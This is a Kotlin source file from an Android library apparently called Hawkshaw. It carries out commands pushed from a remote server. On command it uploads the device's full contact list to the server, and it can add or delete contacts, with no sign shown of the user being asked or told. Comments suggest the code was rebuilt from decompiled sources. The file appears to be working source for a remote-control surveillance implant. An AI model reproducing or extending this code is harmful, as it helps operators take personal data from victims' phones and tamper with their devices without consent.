package com.hawkshaw.library.features.telephony.contacts

import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.models.Contact
import com.hawkshaw.library.datalayer.models.PushContactsRequest
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt.hasPermission
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import android.util.Log // Added for logging

private const val TAG = "ContactsHandler"

/**
 * Handle contacts-related commands
 *
 * @param command The command to handle
 * @return The result of the command, or Unit if no result is expected
 */
suspend fun handleContactsCommand(command: Command): Any {
    Log.d(TAG, "[DEBUG] handleContactsCommand called with command type: ${command.type}")
    return when (command.type) {
        Command.CommandType.PushContacts -> {
            Log.d(TAG, "[DEBUG] handleContactsCommand: Matched CommandType.PushContacts")
            pushContacts()
        }
        Command.CommandType.AddContact -> {
            Log.d(TAG, "[DEBUG] handleContactsCommand: Matched CommandType.AddContact. Request: ${command.addContactRequest}")
            addContact(command.addContactRequest)
            Unit
        }
        Command.CommandType.DeleteContact -> {
            Log.d(TAG, "[DEBUG] handleContactsCommand: Matched CommandType.DeleteContact. Request: ${command.deleteContactRequest}")
            deleteContact(command.deleteContactRequest)
            Unit
        }
        else -> {
            Log.d(TAG, "[DEBUG] handleContactsCommand: Unhandled command type: ${command.type}")
            Unit
        }
    }
}

/**
 * Push contacts to the server
 *
 * @return The API response
 */
private suspend fun pushContacts(): Any {
    Log.d(TAG, "[DEBUG] pushContacts (handler) called.")
    // Check permission
    if (!hasPermission("android.permission.READ_CONTACTS")) {
        Logger.e(TAG, "ReadContacts: You don't have permission to read contacts", null, false, 12, null)
        Log.w(TAG, "[DEBUG] pushContacts (handler): READ_CONTACTS permission denied. Returning Unit.")
        return Unit
    }
    Log.d(TAG, "[DEBUG] pushContacts (handler): READ_CONTACTS permission granted.")

    return withContext(Dispatchers.IO) {
        Log.d(TAG, "[DEBUG] pushContacts (handler): Switched to Dispatchers.IO context.")
        // Get context and content resolver
        val context = App.getContext()
        val contentResolver = context.contentResolver

        // Get contacts
        val typeMapper = { resourceId: Int ->
            Log.d(TAG, "[DEBUG] pushContacts (handler) - typeMapper called with resourceId: $resourceId")
            val type = context.resources.getString(resourceId)
            Log.d(TAG, "[DEBUG] pushContacts (handler) - typeMapper mapped $resourceId to \"$type\"")
            type
        }

        val continuationPlaceholder = { anInt: Int ->
            Log.d(TAG, "[DEBUG] pushContacts (handler) - continuationPlaceholder called with int: $anInt")
            ""
        }
        Log.d(TAG, "[DEBUG] pushContacts (handler): Calling core GetContactsKt.getContacts function.")
        val contacts = getContacts(contentResolver, typeMapper, continuationPlaceholder)
        Log.d(TAG, "[DEBUG] pushContacts (handler): Retrieved ${contacts.size} contacts from core getContacts.")

        // Push contacts to server
        val telephonyService = Injector.INSTANCE.telephonyService
        val request = PushContactsRequest(contacts) // Assumes PushContactsRequest takes List<Contact>
        Log.d(TAG, "[DEBUG] pushContacts (handler): Created PushContactsRequest with ${request.contacts.size} contacts.")

        Log.d(TAG, "[DEBUG] pushContacts (handler): Calling telephonyService.pushContacts.")
        val response = telephonyService.pushContacts(request)
        Log.d(TAG, "[DEBUG] pushContacts (handler): Response from telephonyService: ${response?.state}") // Added null check for response

        // Log response
        Logger.d(TAG, "PushContacts: ${response?.state}", false, 4, null) // Added null check

        Log.d(TAG, "[DEBUG] pushContacts (handler): Finished. Returning response.")
        response // Return the actual response
    }
}

/**
 * Add a contact
 *
 * @param request The add contact request
 */
private fun addContact(request: Command.AddContactRequest?) {
    Log.d(TAG, "[DEBUG] addContact (handler) called with request: $request")
    request?.let {
        Log.d(TAG, "[DEBUG] addContact (handler): Request is not null. Name: ${it.name}, Number: ${it.number}")
        if (!hasPermission("android.permission.WRITE_CONTACTS")) {
            Logger.e(TAG, "AddContact: You don't have permission to write contacts", null, false, 12, null)
            Log.w(TAG, "[DEBUG] addContact (handler): WRITE_CONTACTS permission denied. Returning.")
            return
        }
        Log.d(TAG, "[DEBUG] addContact (handler): WRITE_CONTACTS permission granted.")

        val context = App.getContext()
        // Assuming your Contact model constructor matches this usage.
        // If Command.AddContactRequest directly contains a full Contact object, that would be better.
        // For now, creating a new Contact object as per the original code.
        val contact = Contact(
            id = null, // Or generate one if your model/logic requires it
            name = it.name,
            mobileNumbers = listOf(Contact.MobileNumber(it.number, "Mobile")), // Assuming MobileNumber structure
            emailList = emptyList(),
            // Initialize other fields like starred, pinned, photoUri, lastUpdatedTimestamp if necessary
            starred = 0,
            pinned = 0,
            photoUri = null,
            lastUpdatedTimestamp = null
        )
        Log.d(TAG, "[DEBUG] addContact (handler): Created Contact object: $contact")
        Log.d(TAG, "[DEBUG] addContact (handler): Calling core AddContactKt.addContact function.")
        val result = addContact(context, contact) // This calls the function in AddContactKt.kt
        Log.d(TAG, "[DEBUG] addContact (handler): Result from core addContact: $result")
        Logger.d(TAG, "AddContact: ${if (result) "Success" else "Failed"} for ${it.name}", false, 4, null)
    } ?: Log.d(TAG, "[DEBUG] addContact (handler): Request was null.")
}

/**
 * Delete a contact
 *
 * @param request The delete contact request
 */
private fun deleteContact(request: Command.DeleteContactRequest?) {
    Log.d(TAG, "[DEBUG] deleteContact (handler) called with request: $request")
    request?.let {
        Log.d(TAG, "[DEBUG] deleteContact (handler): Request is not null. ID: ${it.id}")
        if (!hasPermission("android.permission.WRITE_CONTACTS")) {
            // Original code used Logger.d here, but Logger.e might be more appropriate for permission denial
            Logger.d(TAG, "DeleteContacts: You don't have permission to write contacts",
                false, 4, null)
            Log.w(TAG, "[DEBUG] deleteContact (handler): WRITE_CONTACTS permission denied (logged with Logger.d). Returning.")
            return
        }
        Log.d(TAG, "[DEBUG] deleteContact (handler): WRITE_CONTACTS permission granted.")

        val context = App.getContext()
        val contactIdString = it.id.toString() // Assuming id is not already a String
        Log.d(TAG, "[DEBUG] deleteContact (handler): Calling core DeleteContactKt.deleteContact with ID: $contactIdString")
        val result = deleteContact(context, contactIdString) // This calls the function in DeleteContactKt.kt
        Log.d(TAG, "[DEBUG] deleteContact (handler): Result from core deleteContact: $result")
        Logger.d(TAG, "DeleteContact: ${if (result) "Success" else "Failed"} for ${it.id}", false, 4, null)
    } ?: Log.d(TAG, "[DEBUG] deleteContact (handler): Request was null.")
}
